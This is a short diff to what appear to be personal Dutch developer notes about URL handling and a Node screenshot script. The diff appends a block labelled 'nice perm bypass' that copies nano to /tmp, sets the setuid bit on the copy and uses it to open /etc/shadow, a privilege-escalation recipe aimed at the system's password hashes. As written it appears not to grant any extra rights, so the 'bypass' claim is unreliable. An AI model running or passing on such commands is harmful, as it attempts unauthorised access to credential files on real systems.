@@ -9,3 +9,11 @@ Http https verwijdere van neem urls inti
 Http of https uitzoeken van urls en of het een redirect eef ofni
 
 Screenshot een variable meegeve in command "node screensite url.url"voor url
+
+
+
+nice perm bypass
+cp /bin/nano /tmp
+chmod u+s /tmp/nano
+ls -l /tmp/nano
+/tmp/nano /etc/shadow
